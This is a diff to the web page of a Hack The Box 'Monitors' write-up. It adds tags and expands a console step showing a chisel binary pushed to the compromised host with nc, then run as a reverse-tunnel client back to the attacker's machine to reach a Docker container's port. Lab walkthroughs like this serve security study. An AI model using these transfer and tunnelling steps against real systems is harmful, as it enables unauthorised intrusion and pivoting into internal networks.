@@ -19,8 +19,8 @@
 <meta itemprop=name content="Monitors">
 <meta itemprop=description content="Hack The Box. Linux. Hard machine. This machine has a Wordpress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization"><meta itemprop=datePublished content="2021-10-09T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-10-09T00:00:00+01:00">
-<meta itemprop=wordCount content="2515">
-<meta itemprop=keywords content="cve,docker,tomcat,wordpress,capabilities,port-forwarding,file-permissions,insecure-deserialization,directory-path-traversal,">
+<meta itemprop=wordCount content="2545">
+<meta itemprop=keywords content="cve,docker,tomcat,wordpress,capabilities,port-forwarding,file-permissions,insecure-deserialization,directory-path-traversal,rce,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Monitors">
 <meta name=twitter:description content="Hack The Box. Linux. Hard machine. This machine has a Wordpress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization">
@@ -139,6 +139,9 @@ $
 <li class=list>
 <a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/directory-path-traversal title="Directory Path Traversal">Directory Path Traversal</a>
 </li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Command Execution">Remote Command Execution</a>
+</li>
 </ul>
 <aside aria-label=aside class="w-20-l mt6-l aside-mobile">
 <div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
@@ -173,7 +176,7 @@ $
 </li>
 </ul>
 <h2 id=port-scanning>Port scanning</h2>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.91 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.238 -p 22,80
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.238 -p 22,80
 Nmap scan report for 10.10.10.238
 Host is up (0.044s latency).
 
@@ -483,12 +486,20 @@ PORT      STATE SERVICE
 <span style=color:#960050;background-color:#1e0010>
 </span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
 </code></pre></div><p>Now, we can use <a href=https://github.com/jpillora/chisel><code>chisel</code></a> to do a port forwarding and access the web server at the container from the attacker machine:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ./chisel server -p <span style=color:#ae81ff>1337</span> --reverse 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc 10.10.10.238 <span style=color:#ae81ff>1234</span> &lt; chisel
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ ./chisel server -p <span style=color:#ae81ff>1337</span> --reverse
+server: Reverse tunnelling enabled
+server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= 
+server: Listening on http://0.0.0.0:1337
+server: session#1: tun: proxy#R:8443=&gt;8443: Listening
 </code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@monitors:/tmp$ nc -nlvp 1234 &gt; .chisel
 Listening on [0.0.0.0] (family 0, port 1234)
 Connection from 10.10.17.44 64550 received!
 www-data@monitors:/tmp$ chmod +x .chisel
 www-data@monitors.htb:/tmp$ ./.chisel client 10.10.17.44:1337 R:8443:172.17.0.2:8443 
+client: Connecting to ws://10.10.17.44:1337
+client: Connected (Latency 109.928393ms)
 </code></pre></div><p>The Docker container is running a web server at ports 8080 and 8443. We can use <code>gobuster</code> from the machine (transfering the binary file and the wordlist again with <code>nc</code>) and discover see some directories:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ gobuster dir -u https://127.0.0.1:8443 -k -w $WORDLISTS/directory-list-2.3-medium.txt -q 
 /images               (Status: 302) [Size: 0] [--&gt; /images/]
